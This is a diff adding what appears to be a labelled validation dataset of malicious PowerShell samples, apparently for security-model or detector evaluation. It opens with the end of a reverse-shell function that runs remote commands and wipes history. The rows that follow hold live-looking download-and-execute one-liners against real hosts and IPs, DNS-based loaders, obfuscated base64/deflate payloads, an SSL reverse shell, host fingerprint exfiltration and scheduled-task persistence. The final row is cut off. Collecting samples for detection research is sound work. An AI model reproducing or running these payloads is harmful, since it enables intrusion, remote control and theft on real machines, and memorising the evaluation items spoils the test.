+                $Stream.Write($SendBytes,0,$SendBytes.Length);$Stream.Flush()
+
+                While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
+                {
+
+                    $Command = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($Bytes,0, $i)
+
+                    If ($Command.StartsWith(""kill-link""))
+                    {
+
+                        If ($ClearHistory.IsPresent)
+                        {
+
+                            Write-Output ""[*] Attempting to clear command history""
+
+                            $CmdHistoryFiles = ""$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Visual Studio Code Host_history.txt"",""$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\Windows PowerShell ISE Host_history.txt"",""$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt""
+
+                            Clear-History
+                            Clear-Content -Path $CmdHistoryFiles -Force -ErrorAction SilentlyContinue
+
+Set-PSReadlineOption –HistorySaveStyle SaveNothing
+
+                        }  # End If
+
+                        Write-Verbose ""Closing client connection""
+                        $Client.Close()
+                        Write-Verbose ""Client connection closed""
+                        Exit
+
+                    } # End If
+                    Try
+                    {
+
+                        # Executes commands
+                        If ($Obfuscate.IsPresent)
+                        {
+
+                            Write-Verbose ""Obfuscating command""
+
+                            $Base64Cmd = ([Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(""$Command"")))
+                            $ExecuteCmd = PowerShell.exe -EncodedCommand $Base64Cmd -NoLogo -NoProfile -ExecutionPolicy Bypass | Out-String
+                            $ExecuteCmdAgain = $ExecuteCmd + ""PS "" + (Get-Location).Path + ""> ""
+
+                        }  # End If
+                        Else
+                        {
+
+                            $ExecuteCmd = Invoke-Expression -Command $Command 2>&1 | Out-String
+                            $ExecuteCmdAgain  = $ExecuteCmd + ""PS "" + (Get-Location).Path + ""> ""
+
+                        }  # End Else
+
+                    } # End Try
+                    Catch
+                    {
+
+                        $Error[0].ToString() + $Error[0].InvocationInfo.PositionMessage
+                        $ExecuteCmdAgain  =  ""ERROR: "" + $Error[0].ToString() + ""`n`n"" + ""PS "" + (Get-Location).Path + ""> ""
+
+                    } # End Catch
+
+                    $ReturnBytes = ([Text.Encoding]::ASCII).GetBytes($ExecuteCmdAgain)
+                    $Stream.Write($ReturnBytes,0,$ReturnBytes.Length)
+                    $Stream.Flush()
+
+                } # End While
+                $Client.Close()
+
+            }  # End Reverse Switch
+
+            'Bind' {
+
+            Write-Warning ""Sorry this is not there yet. I am still figuring this part out""
+            $Client = New-Object -TypeName System.Net.Sockets.TCPClient($IpAddress,$Port)
+            $Stream = $Client.GetStream()
+
+            While (($i = $Stream.Read($Bytes, 0, $Bytes.Length)) -ne 0)
+            {
+
+                $ReturnBytes = ([Text.Encoding]::ASCII).GetBytes($Stream)
+                $Stream.Write($ReturnBytes,0,$ReturnBytes.Length)
+                $Stream.Flush()
+
+            } # End While
+
+            $Client.Close()
+
+            }  # End Bind Switch
+
+            }  # End Switch
+
+        } # End Try
+        Catch
+        {
+
+            Write-Output ""There was a connection error. Retrying occurs every 30 seconds""
+
+            Write-Verbose ""Client closing...""
+            $Client.Close()
+            Write-Verbose ""Client connection closed""
+
+            Write-Verbose ""Begining countdown timer to reestablish failed connection""
+            [Int32]$Timer = 30
+            Set-Variable -Name Length -Value ($Timer / 100)
+
+            For ($Timer; $Timer -gt 0; $Timer--)
+            {
+
+                Set-Variable -Name Text -Value (""0:"" + ($Timer % 60) + "" seconds left"")
+                Write-Progress -Status $Text -Activity ""Attempting to re-establish connection in: "" -PercentComplete ($Timer / $Length)
+                Start-Sleep -Seconds 1
+
+            }  # End For
+
+        } # End Catch
+
+    } # End While
+    $Client.Close()
+    If ($Listener)
+    {
+
+        $Listener.Stop()
+
+    }  # End If
+
+} # End Function Invoke-ReversePowerShell"
+seed_deed4f58b70d,137.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,13,malicious,DownloadFile,DownloadFile|Net.WebClient|Start-Process,cross_runtime,malicious,5.046875,110,"(New-Object System.Net.WebClient).DownloadFile('http://cajos.in/0x/1.exe','mess.exe');Start-Process 'mess.exe'"
+seed_6f4b268bd776,fa2y/malicious_samples/bcd9fe7a98567679a87df68d07a1b9398df6db528abd28efe2336bc9f6fea7a7.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,14,malicious,DownloadFile,DownloadFile|Net.WebClient|Start-Process,cross_runtime,malicious,5.78125,113,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/aba.exe','mess.exe');Start-Process 'mess.exe'"
+seed_a95975b607c4,fa2y/malicious_samples/fec6779d4d6bd700f980dd3c7dfcb3c20665c15d4731e69e8576c1b43b898384.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,15,malicious,DownloadFile,DownloadFile|Net.WebClient|Start-Process,cross_runtime,malicious,5.8125,113,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/com.exe','mess.exe');Start-Process 'mess.exe'"
+seed_15b1474c517d,fa2y/malicious_samples/34dcf2a22fa7555de2ab95c3d8ab5605de01345b8d741491e1907ecd50a5ea1f.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,16,malicious,DownloadFile,DownloadFile|Net.WebClient|Start-Process,cross_runtime,malicious,5.84375,114,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/igbo.exe','mess.exe');Start-Process 'mess.exe'"
+seed_a2a9f5be9c2a,fa2y/malicious_samples/fef9fdbb642fd0bebbc11aca6676ed8532eb3a5dd1c71eb38a260d4b21f9aaae.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,17,malicious,DownloadFile,DownloadFile|Net.WebClient|Start-Process,cross_runtime,malicious,5.40625,114,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/immo.exe','mess.exe');Start-Process 'mess.exe'"
+seed_499ee93d35bf,1927.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,18,malicious,DownloadFile,DownloadFile|Net.WebClient|Start-Process,cross_runtime,malicious,7.46875,115,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/nigga.exe','mess.exe');Start-Process 'mess.exe'"
+seed_0c54b17ebe6b,fa2y/malicious_samples/0f5e36a549a4ec6e0605f7310205ebdd5141c532959bd9bf5ee25f06560e7c18.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,19,malicious,DownloadFile,DownloadFile|Net.WebClient|Start-Process,cross_runtime,malicious,5.53125,115,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/kells.exe','mess.exe');Start-Process 'mess.exe'"
+seed_e8225ca71fe4,fa2y/malicious_samples/17dcaeeb7d93c8bc0150f4e1b471d81dd003be37bbaa6d2edf612dfb6a357dbc.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,20,malicious,DownloadFile,DownloadFile|Net.WebClient|Start-Process,cross_runtime,malicious,5.90625,115,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/kelle.exe','mess.exe');Start-Process 'mess.exe'"
+seed_09659d17cb23,450.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,163,malicious,DownloadString,IEX|DownloadString|Net.WebClient,cross_runtime,malicious,1.375,75,iex (new-object net.webclient).downloadstring('https://invesco.online/aaa')
+seed_66f8f0994bce,3062.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,164,malicious,DownloadString,IEX|DownloadString|Net.WebClient,cross_runtime,malicious,4.96875,78,IEX ((New-Object Net.WebClient).DownloadString('http://93.171.205.35:8080/'));
+seed_109e3e5424a0,338.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,165,malicious,DownloadString,IEX|DownloadString|Net.WebClient,cross_runtime,malicious,4.59375,78,IEX (New-Object Net.WebClient).DownloadString('http://91.120.23.152/wizz.txt')
+seed_36e17531a823,fa2y/malicious_samples/cc76beb5bcf6880dee2d739a37e218871500d5d610c7989e7371b2594c2d594e.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,167,malicious,DownloadString,IEX|DownloadString|Net.WebClient,cross_runtime,malicious,1.59375,80,IEX ((New-Object Net.WebClient).DownloadString('http://192.168.137.241:8080/'));
+seed_eb139569f490,3100.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,168,malicious,DownloadString,IEX|DownloadString|Net.WebClient,cross_runtime,malicious,0.625,81,IEX ((new-object net.webclient).downloadstring('http://pmlabs.net/cis/test.jpg'))
+seed_dc2fdf741f87,3438.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,169,malicious,DownloadString,IEX|DownloadString|Net.WebClient,cross_runtime,malicious,4.421875,81,"iex (New-Object Net.WebClient).DownloadString(""http://52.183.79.94:80/TYBMkTfsQ"")"
+seed_c61abb38370f,fa2y/malicious_samples/67508635020243fc67eb003f214fc569733988db121516a1571f3c8de2589864.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,171,malicious,DownloadString,IEX|DownloadString|Net.WebClient,cross_runtime,malicious,2.171875,90,IEX (New-Object Net.WebClient).DownloadString('http://cannot.loginto.me/googlehelper.ps1')
+seed_e517072ea782,fa2y/malicious_samples/f1f2958356c98c4d296a747490c067cc11cd53b2812e5d69846069aef6d9adb6.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,172,malicious,DownloadString,Invoke-Expression|DownloadString|Net.WebClient,cross_runtime,malicious,2.421875,90,Invoke-Expression (New-Object Net.Webclient).Downloadstring('http://tinyurl.com/y7ukpduz')
+seed_0de74614c959,fa2y/malicious_samples/231032778ec6e8baa7807ce3aeae9924bd62a36516d2655219d9334e0339c874.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,227,malicious,FromBase64String,IEX|FromBase64String,cross_runtime,malicious,2.421875,142,"$qwertyuioop = @'
+
+'@
+
+
+$Decryption= [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($qwertyuioop))
+
+IEX $Decryption"
+seed_08885a1277fd,fa2y/malicious_samples/6720e41d88ed2f892215d88b38aa9a971695bc7a97dfcc2ed9a46762cb7b7fb1-obf-out-compressedcommand.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,228,malicious,FromBase64String,FromBase64String,cross_runtime,malicious,1.953125,389,"powershell      ""(NeW-oBJecT  sySTeM.io.StReaMreadER((NeW-oBJecT  systeM.io.cOMPrEsSIon.defLatesTReam([sYStEM.io.MemOrYStrEAM][cOnVErt]::froMbaSE64sTRINg( 'BcExDoAgDAXQnVOwAYOwe5sCjdaQXyONeHzfc8Kfj+C1ab24mQdbXlzbEIal3HVhKPVpj+CI4TS7516K4OXZNCuGgAsRheTcDw==') , [IO.comPReSsiON.CoMPrESSiOnmodE]::DEcomPReSS) ), [SYSteM.TeXt.ENcodING]::ascIi)).READToEND( ) | .( $PShOME[21]+$PShOmE[30]+'x')"""
+seed_6a8d50943b65,fa2y/malicious_samples/da55a541a85869e526346ae2bff1bc8f2658e49cbf7c0a13a038e34cc9b61c80-obf-out-compressedcommand.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,229,malicious,FromBase64String,FromBase64String,cross_runtime,malicious,1.0625,463,"powershell      "" (NEw-oBJeCT  iO.StREaMrEadER( (NEw-oBJeCT SysTeM.IO.cOMPREssiOn.dEFLATEsTReAM( [sYStEM.io.MeMOrYSTREAm][SYStEM.ConVeRT]::FrombAsE64StrINg('HY2xDoIwGAZ3noKBBBqljbpBnDSOaMLgXMpnqCl/G/rH6turrHfJXVYVY3DHAvRqGHPYlA+JN0rRVh1SfR2eMJz3n/iTsgPLO4aTsyAW8uwTOa/Hi3Woyok5NEqllKSeY4Dx5CxBGj+r3f6gSJNe09v8vxRtz3rh+rZ4gxhXlmVf' ) ,[io.cOMPREsSiOn.CoMPReSSIonMOde]::decOmpReSS ) ), [System.tEXt.encODINg]::aSCII) ).READToeND()| .( $shelLId[1]+$sHELlId[13]+'X')"""
+seed_d615372dd4aa,3780.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,230,malicious,FromBase64String,IEX|FromBase64String,cross_runtime,malicious,1.0625,499,"sal a New-Object;iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('TY9NawIxFEX3gv8hDC5ayiRCWxcDImWK4EZLS+lCu5hJ3micTDImL/Px7/t0U5ePe+7hvoct9OmuPINE9jUGhIZvAfkPlLnRYPGRf3g3jDz3oOjUhQlsyfZ36H+SF/IEv1n2DlURDVLYO1/fNaeT6WQWvSFDckJsQyaEMlx515ZuiAG8dBYJ5tI1Iog+wGsXnkdVN+fLcRCV8+to36yiTZVGXi5eVsos5wlpK22AvDOwXUbTWvbEkkNTGC21i+GKErWxnashpe8+4RIhIEu/vWa3Teku4voquan+AA=='),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"
+seed_3d9b93e512ca,fa2y/malicious_samples/8dda9183d7180c5cdbf9d9c55eaab049d617d29c507570f7697b3755cb65e3c8-obf-out-compressedcommand.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,231,malicious,FromBase64String,FromBase64String,cross_runtime,malicious,2.40625,526,"powershell     ""& ((gV '*mdR*').name[3,11,2]-JoIN'') (new-ObjEct  sYStEm.IO.coMpREsSiOn.dEflatestream( [Io.mEmOrystReAM] [sYstem.ConVERt]::fROMBASE64sTrinG('fYo9D4IwFAB3fgUhJkAiZcfRj00kwcTFxJT2KcXSh7yHlX9vdHRwukvugqQEnx2aDhSH9UwMvSiBxQmatTXgOBUb9M6i1DtjIYlb5qHIc++98CAtt9Lp9is4kFDY5z3qyQJ9eAFJc2Px9piMug9InFvpNZlOI1wFvCBeRgtwz+K43Vfnnxalq5rlyFk1ogKiMPn3BsEb' ), [SysTEm.IO.comprESsION.COmPreSSiONModE]::deComPresS)| FOrEach-OBjEct {new-ObjEct io.STrEaMreAdEr($_,[teXT.encodinG]::aSciI ) } | FoReAch-oBjEcT{$_.ReadTOeNd() } ) """
+seed_f5023e9dd9b9,fa2y/malicious_samples/267664dc02eed4515fef26ea374e818fb95839e156c42996d619a3855ec8b1b2.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,232,malicious,FromBase64String,FromBase64String,cross_runtime,malicious,5.71875,841,"powershell.EXE -w hidden -c function a($u){$d=(Ne`w-Obj`ect Net.WebC`lient).'DownloadData'($u);$c=$d.count;if($c -gt 173){$b=$d[173..$c];$p=New-Object Security.Cryptography.RSAParameters;$p.Modulus=[convert]::FromBase64String('2mWo17uXvG1BXpmdgv8v/3NTmnNubHtV62fWrk4jPFI9wM3NN2vzTzticIYHlm7K3r2mT/YR0WDciL818pLubLgum30r0Rkwc8ZSAc3nxzR4iqef4hLNeUCnkWqulY5C0M85bjDLCpjblz/2LpUQcv1j1feIY6R7rpfqOLdHa10=');$p.Exponent=0x01,0x00,0x01;$r=New-Object Security.Cryptography.RSACryptoServiceProvider;$r.ImportParameters($p);if($r.verifyData($b,(New-Object Security.Cryptography.SHA1CryptoServiceProvider),[convert]::FromBase64String(-join([char[]]$d[0..171])))){I`ex(-join[char[]]$b)}}}$url='http://'+'t.amy'+'nx.com';a($url+'/a.jsp?ipc_20201126?'+(@($env:COMPUTERNAME,$env:USERNAME,(get-wmiobject Win32_ComputerSystemProduct).UUID,(random))-join'*'))"
+seed_9cf7f8cbe858,fa2y/malicious_samples/ab5bf66fd34dc6b81e63b467464414b59e44a122c5b91e82c3a4e37b9aabb162-obf-out-compressedcommand.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,233,malicious,FromBase64String,FromBase64String,cross_runtime,malicious,1.359375,848,"powershell    "" & ( $veRboSepREFERence.toStriNg()[1,3]+'x'-JoiN'') (new-obJECt  iO.STreaMREaDER((new-obJECt system.Io.COMprEsSiOn.dEFlatEStrEAM([IO.memoRYstrEAM] [conVert]::FROMbasE64STRInG('LZB/j5owHIf/91U0Fwywm6Usd87BWILQKQ6LA3ZomLkg9rSBAwdl6n689xWz/77pt5+nn6eDNNpEMV5CQmMY4fCJ5XhVe4QvM5IdaLg1DLw+YYfrCDk1iRnpKLAAMqWzYxGcjILpAjsxiK7/KRwmeOr4HibclDpLXta/WFlm2iNEQElYta/PLSAxGEPdBEmQjB9MEDdsTyuuvYfIBM1PQ9chUkHJCgpmNC9qWbyWwznNXBq20Hb3ivytpc3IPoiU/Fbq1NuFVVhfNqKcUGpj+goJjkWZXUi/djjiwsTFn7Ou5OJs1QSXa+9wC12h01CXVjGzy/YG6G16ABcb7OKKs8x3snyOb5QXu/O5oCdBWPRJLJJZ2ZrSF0v2n43vc5MNldmPx8tUJ+mbl83T+fS6iz7tsbr4KFyYhcw0P9pNut1KU0tJnXnWz0ov4dbnyg/sfRQ3XjVT7o6cnwxN0z+8g/p4AhF8QMYETZAmvpJeYNae7lRV/TP8LT2PduugkYpUYvf3Q6mAPiUHftz+NT28Boo0HS0Cr5JldTD4Bw==' ), [SyStem.Io.COmpreSSion.CompresSIonModE]::DecoMprEsS) ) ,[sysTem.TeXt.eNcodING]::AScII)).reAdtOeNd()"""
+seed_180b70b0403f,1298.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,234,malicious,FromBase64String,IEX|FromBase64String,cross_runtime,malicious,3.625,1084,"$path= ""$env:userprofile\appdata\local\microsoft\Windows""
+
+if(-not(Test-Path -Path($path)))
+{mkdir $path}
+
+$fileout=""$path\L69742.vbs"";
+
+$encstrvbs=""c2V0IHdzcyA9IENyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQpzdHIgPSAicG93ZXIiICYgInNoIiAmICJlbGwiICYgIi5lIiAmICJ4ZSAtTm9QIC1zdGEgLU5vbkkgLWUiICYgInhlIiAmICJjIGJ5cCIgJiAiYXMiICYgInMgLWZpIiAmICJsZSAiDQpwYXRoID0gIiNkcGF0aCMiDQpzdHIgPSBzdHIgKyBwYXRoICsgIlxtYy5wczEiDQp3c3MuUnVuIHN0ciwgMCANCg0K"";
+
+$bytevbs=[System.Convert]::FromBase64String($encstrvbs);
+
+$strvbs=[System.Text.Encoding]::ASCII.GetString($bytevbs);
+
+$strvbs = $strvbs.replace('
+
+set-content $fileout $strvbs;
+
+$tmpfile=""$env:TEMP\U1848931.TMP"";
+
+
+
+$pscode_b64  =get-content $tmpfile | out-string;
+
+$pscode_b64=$pscode_b64.trim();
+
+
+$pscode = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($pscode_b64))
+
+$id = [string](get-random -min 10000 -max 100000)
+
+$pscode = $pscode.replace('
+
+set-content ""$path\mc.ps1"" $pscode
+
+
+$taskstr=""schtasks /create /F /sc minute /mo 2 /tn """"GoogleServiceUpdate"""" /tr """"\""""$fileout""""\""""   "";
+
+
+
+iex 'cmd /c $taskstr';"
+seed_a4fecca9d2bf,fa2y/malicious_samples/f55369c6d50c5a57c0a54c0d1a1560c0601e17f08d64f94a0fea9eed9768beae.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,271,malicious,IEX,IEX,cross_runtime,malicious,0.78125,27,irm massgrave.dev/get | iex
+seed_5f819bb0b3c0,fa2y/malicious_samples/93a790e0a65d0a47a7988e81f069c4c7044802c50848735dcaf0f6b0ef921dcd.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,272,malicious,IEX,IEX,cross_runtime,malicious,0.984375,35,irm https://massgrave.dev/get | iex
+seed_96df7e49f7a4,784.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,273,malicious,IEX,IEX,cross_runtime,malicious,0.390625,73,"if(""""+(nslookup -q=txt l.ns.huawel.ro.) -match ""@(.*)@""){iex $matches[1]}"
+seed_2f848d678a4e,2752.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,276,malicious,IEX,IEX,cross_runtime,malicious,0.703125,82,if(''+(nslookup -q=txt p.s.w2.ns.rankingplac.pl) -match '@(.*)@'){iex $matches[1]}
+seed_93d76af29de1,fa2y/malicious_samples/26493876411716e344173fdfd39aa4e85e740361f53b92ef17eba897890c50e4.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,277,malicious,IEX,IEX,cross_runtime,malicious,0.5625,82,if(''+(nslookup -q=txt p.s.rk.ns.rankingplac.pl) -match '@(.*)@'){iex $matches[1]}
+seed_28d4ebd2f1f6,fa2y/malicious_samples/96d6a9c601102cb92802dfc3f8774cdc26fd778e1968de2eca6d0a4d2a873b4e.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,278,malicious,IEX,IEX,cross_runtime,malicious,0.375,82,if(''+(nslookup -q=txt p.s.os.ns.rankingplac.pl) -match '@(.*)@'){iex $matches[1]}
+seed_ae923919854c,fa2y/malicious_samples/417a0be8ef6073897f81fa6912d3a203a9aea432e16af30fe32376671cfa0d44.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,281,malicious,IEX,IEX,cross_runtime,malicious,3.0625,167,"curl -o ""$HOME\desktop\arch.exe"" ""https://transfer.sh/get/ffP3dc/CrocTech.exe""
+
+powershell.exe -ExecutionPolicy bypass -windowstyle hidden iex ""$HOME\desktop\arch.exe"""
+seed_58333cda3aa9,fa2y/malicious_samples/94601fc7759612cc1ce13844d6c26cd3ac2e547a1c96e87ae4e2b87a1c2c57e1.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,282,malicious,IEX,IEX,cross_runtime,malicious,4.515625,212,"powershell -ExecutionPolicy Bypass -windowstyle hidden curl -o ""$HOME\desktop\a.exe"" ""https://transfer.sh/get/ffP3dc/CrocTech.exe""
+
+powershell -ExecutionPolicy Bypass -windowstyle hidden iex ""$HOME\desktop\a.exe"""
+seed_a1c48f07b5fc,fa2y/malicious_samples/bb7ed7fc743fca6580548f10fd120bcfc876241147dbab7ad93ce5d70677d6d1-obf-out-encodedhexcommand.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,307,malicious,Invoke-Expression,Invoke-Expression,cross_runtime,malicious,3.546875,472,"powershell     ""InVOKe-EXPresSIon( ""$(sET-item  'vaRIablE:oFS'  '' ) "" + [sTRIng]('as69s65&78}20>28&28s4e~65>77,2d~4f}62s6a~65,63-74&20>4e,65>74s2e-57s65~62>43>6c>69>65,6e>74s29T2e&44,6f~77T6e~6c~6f}61>64T53s74-72,69T6e,67T28~27&68,74&74s70T3a&2f-2f,37>36T2e}37>34>2es31~32&37T2e,33,38s2f,64T65,66}61&75~6cT74T2dT6eT63,6f&2e~68s74}6d&6c~27&29~29,a~a'.SpLIT('T}>~s,&-')| fOreAcH {( [cHar] ([coNvERT]::tOiNt16( ([string]$_),16) ))}) +""$( seT-ItEM  'vArIable:oFS' ' ' ) "" ) """
+seed_b2afc62d50dc,fa2y/malicious_samples/7cfd8d4f70696d1369eb1a3707a740186099c1bbb000739989c2d73f16a97c5d-obf-out-compressedcommand.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,309,malicious,Invoke-Expression,Invoke-Expression|FromBase64String,cross_runtime,malicious,2.734375,902,"powershell      ""(NEW-OBJEct SYSTEm.io.compreSSIon.dEFLaTESTrEam([SySTeM.iO.memoRYstreAM][conVErt]::FroMbasE64StRiNg( 'VZFhb5swEIa/91egyhWgLg5kTaoF8YGAl7C2kAU6EqFocswl8UKhMqZN1vW/z0TbpH2zTn6fe+7uIk9WSUqecAQSJyBeOIN5zCv5QCNvCmI9HpPjHHxpW5YfVzKsWtBczXLQK3MjkvXizRfCpJac/lEymPhlCFXqoNbVH+qfvCxpf4gtzch4VdSvjRal2gjbjpbF2ejG0VLBC6hk/xZbjiZexraNLVMr+QG0KbBDrTt5cmok/G9Zny0rujtbdlUQPgjJt5xRCd9oyQsqeV35tCw3lB2U9xuSooV3Ze/jGaEFWSTYCwpDf2xA9LydstA/oNbsxsNzUR9XKtQ1Pw9H0m64BfnakiRVPQPy2XssU1Xrvp7+hpYr7AsI1AZCWiZnwOoPQGJ/AQGJJPfufcr20FFg21EUPavFQSULovaskg66c/Xh6ONmYLNPG7BG24F9Y4M9GjCbWYwN4bawdQeFruXkbO+JfL1GE9fI2Yx2b6PzCeqsKmsaJHLBo51xuZfyuRn3+08NbeUeVyD76ihwxLR5vjRN89fVG/re2yzjBTrkiF9fX6E7fE+qaTpbvzshWWoGmvR+xGGk6+bFxW8=' ) ,[sySTeM.IO.COmPREssION.comPRessiONMOde]::DEcomPrEsS) |fOReACH{NEW-OBJEct SYstEm.IO.StrEAMrEaDER($_ ,[SYSteM.TeXt.encodInG]::AsCII ) }|FoREAch { $_.REAdtOEnd( ) })| InVoKE-exPREsSiOn"""
+seed_b29df5de3d49,fa2y/malicious_samples/fc9da60ea75819923b8a947dfe2ac25422bc534ae45b680bb8b177cb2e90415d.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,310,malicious,Invoke-Expression,Invoke-Expression,cross_runtime,malicious,2.609375,947,"powershell -nop -W hidden -noni -ep bypass -c ""$TCPClient = New-Object Net.Sockets.TCPClient('198.58.102.19', 9333);$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream,$false,({$true} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com',$null,$false);if(!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {$SslStream.Close();exit}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()};WriteToStream '';while(($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"""
+seed_a5cda033f923,2019.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,311,malicious,Invoke-Expression,Invoke-Expression|FromBase64String,cross_runtime,malicious,0.125,1173,"Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String('lVVNb9pAEL0j8R/2YAlbwRuTRFXbKId8tYpUBYRT9RBycNYD2WJ2qXddSBH/vbMfBhzRNOFi8L438+bNzDKuBNNcCsIKyEQ1J6t2i49JGLCCg9D0UgoBTENOYvhFAl1WEJHV5rSQCsJo7TnzUjJQil4vub6UOZBYAAlEVRSGU59uSYA4fBwekhQ05r4ZnF9dDdutIMvzEqHkjHR6n45o78NHeoKP46PODnrQH94hdi5LbYAn+MFjLw3f3MIi7j/+RPVEPSsNMypAUyXZFLSims0dckOhzNUa1um7NnaEAKVLyGYYs4Z+BZ3ad6E5xrgLWU4fq/EYymbm1GW+eNZw/7ChD4EB/w0XlpDyP2DqcPbspV/xbCKk0pwpOnC4LYOmOiv1jRhL+oUXcJvNwPhx+Xk0WnCRy4UajZwBx0ejEZvlFJbQ2csfQs5LzItvRJ6V+Y2YV8bK3pvQ/Uq/Bv+uIH2CorheAqu00Zi8xFk3uUm6dXwHsNWEMGmz/Rvn1LRbNnCcFgBzKwwEkzkXE+QINFo2jL6DpabninF+7WHt1uIJXQ0b+egAYBpGdr7jXrQyh+QARdTB/YDgtxfEIWR5GJnh90NFf5RcY/hdppkWZYlRN+maJ/0GYqKfIle3Kdds1SkJcimMk8E4KxTgbyRqV1xy6qWTMBZSO2j0yn6bXfX77S+DtV0vZYORgLvO+pgh/o4nmiToAhputh+RcYGJGutQK7eZA6w4N3J33WjizdLh5u2LQWJiDiOn6uDMRjsl7uoxyZ2OBvU+oTSwx9inBxLjjuuMC0V6iZH0iCGm6839ZYK4mlauQc7KvW1tqk66tbSd8aUL11sXCA+VnUVVz+L/L81tIwD7a1X5/r910t40vz7seybY+25o9p/B10hWXmCns373kBf7hrzRCPNivSbOjNoczPMX')))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();"
+seed_5d5b38fd7e2d,fa2y/malicious_samples/6fdb0e55700963ba4bd389e29b30c566bda1bc3534053636ab48e76838337c42-obf-out-compressedcommand.ps1,artifacts/foundation_sec/circuit_val_aug_orig_families_valid_h100.csv,312,malicious,Invoke-Expression,Invoke-Expression|FromBase64String,cross_runtime,malicious,1.0,1174,"powershell     "" ( nEW-oBJEcT iO.CompReSsIOn.dEFlaTeSTreAm( [sYSteM.io.mEmORySTrEaM] 